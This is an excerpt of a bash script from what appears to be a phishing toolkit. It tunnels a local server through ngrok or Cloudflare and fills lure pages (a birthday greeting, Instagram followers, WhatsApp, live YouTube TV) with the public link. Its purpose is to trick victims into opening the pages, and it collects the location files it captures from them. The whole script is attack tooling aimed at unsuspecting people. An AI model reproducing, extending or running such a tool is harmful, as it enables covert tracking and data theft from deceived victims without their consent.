...
# Clean exit on Ctrl+C (SIGINT) - call stop() so ngrok/php/cloudflared are killed
trap 'printf "\n\n${RED}[!] Process cancelled by user. Cleaning up...${NC}\n"; stop' SIGINT

banner() {
    clear
    printf "${BLUE}┌────────────────────────────────────────────────────────┐${NC}\n"
    printf "${BLUE}│${NC} ${PURPLE}${BOLD}    ____   __  __      ____          _        ${NC} ${BLUE}│${NC}\n"
    printf "${BLUE}│${NC} ${PURPLE}${BOLD}   / ___|  |  \/  |    / ___|  _ __ | |_ ___  ${NC} ${BLUE}│${NC}\n"
    printf "${BLUE}│${NC} ${PURPLE}${BOLD}  | |      | |\/| |   | |  _  | '_ \| __/ __| ${NC} ${BLUE}│${NC}\n"
    printf "${BLUE}│${NC} ${PURPLE}${BOLD}  | |___   | |  | |   | |_| | | | | | |_\__ \ ${NC} ${BLUE}│${NC}\n"
...
catch_location() {
  ...
  # Then check for any location_* files (fixed glob check)
  if ls location_*.txt > /dev/null 2>&1; then
    location_file=$(ls location_*.txt | head -n 1)
...
if [[ "$windows_mode" == true ]]; then
    ...
    printf "\e[1;92m[\e[0m+\e[1;92m] Waiting for Cloudflare tunnel link...\n"
    link=""
    for i in {1..15}; do
        if [[ -f ".cloudflared.log" ]]; then
            link=$(grep -E -o 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' .cloudflared.log | head -n 1)
            if [[ -n "$link" ]]; then
                break
            fi
        fi
...
payload_cloudflare() {
    ...
    if [[ $option_tem -eq 1 ]]; then
        sed -e 's+forwarding_link+'$link'+g' -e 's+birthday_name+'$name'+g' Birthdaywish.html > index2.html
    elif [[ $option_tem -eq 2 ]]; then
        sed 's+forwarding_link+'$link'+g' Instagram.html > index2.html
    elif [[ $option_tem -eq 3 ]]; then
        sed -e 's+forwarding_link+'$link'+g' -e 's+whatsapp_number+'$whatsapp_number'+g' Whatsapp.html > index2.html
    else
        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index2.html
    fi
}
...
printf "\e[1;92m[\e[0m+\e[1;92m] Waiting for Ngrok tunnel link...\n"
link=""
for i in {1..15}; do
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -E -o 'https://[a-zA-Z0-9.-]+\.(ngrok-free\.app|ngrok\.io|ngrok\.app)' | head -n 1)
    if [[ -n "$link" ]]; then
        break
    fi
    sleep 1
...
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Birthday Wish\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Instagram Followers\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Whatsapp Number\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Live YouTube TV\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Birthday Boy/Girl Name: \e[0m' name
name="${name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Instagram ID: \e[0m' instagram_ID
elif [[ $option_tem -eq 3 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Whatsapp Number: \e[0m' whatsapp_number
printf ""
